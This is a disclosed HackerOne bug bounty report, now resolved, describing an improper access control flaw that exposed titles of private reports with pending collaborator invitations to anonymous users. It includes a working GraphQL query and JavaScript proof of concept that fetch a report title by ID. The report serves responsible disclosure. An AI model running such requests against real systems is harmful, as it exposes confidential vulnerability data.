---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2312029'
original_report_id: '2312029'
title: View Titles of Private Reports with pending email invitation
weakness: Improper Access Control - Generic
team_handle: security
created_at: '2024-01-11T06:20:59.824Z'
disclosed_at: '2024-01-16T09:17:25.182Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 186
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# View Titles of Private Reports with pending email invitation

## Metadata

- HackerOne Report ID: 2312029
- Weakness: Improper Access Control - Generic
- Program: security
- Disclosed At: 2024-01-16T09:17:25.182Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**

If a private report has a pending email invitation for collaboration, an anonymous user can see the title of the report.
This only works for anonymous users, and the collaboration invitation must be through Manage Collaborators invitation panel.

**Description:**

### Steps To Reproduce

1. As victim:
In a report to a bug bounty program, add a collaborator, using any email, such as: ██████████
Save the integer ID of the report.

2. In a new, **anonymous/unauthenticated/logged-out** session:
Send GraphQL request, replacing PRIVATE_REPORT_ID integer:
```graphql
{
  report(id:IPRIVATE_REPORT_ID){
    title
  }
}
```
OR run JS implementation:
By visiting hackerone.com/hacktivity as anonymous:
```js
const csrf_token = document.getElementsByName("csrf-token")[0].getAttribute("content")
const REPORT_ID = PRIVATE_REPORT_ID // integer

var resp = await(await fetch("https://hackerone.com/graphql", {
  "headers": {
    "accept": "*/*",
    "content-type": "application/json",
    "x-csrf-token": csrf_token,
  },
  "body": JSON.stringify({
    "operationName": "HacktivitySearchQuery",
    "variables": {
        "reportId": REPORT_ID
    },
    "query": `query HacktivitySearchQuery($reportId: Int!) {
  report(id: $reportId){
    id
    url
    title
  }
}
`
}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
})).json()
console.log(resp.data.report)
```
The title of the report is the response, confirming the vulnerability.

## Impact

Can read titles of possibly unfixed reports. This can be leveraged against the program, depending on the specificity of the title in the report.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
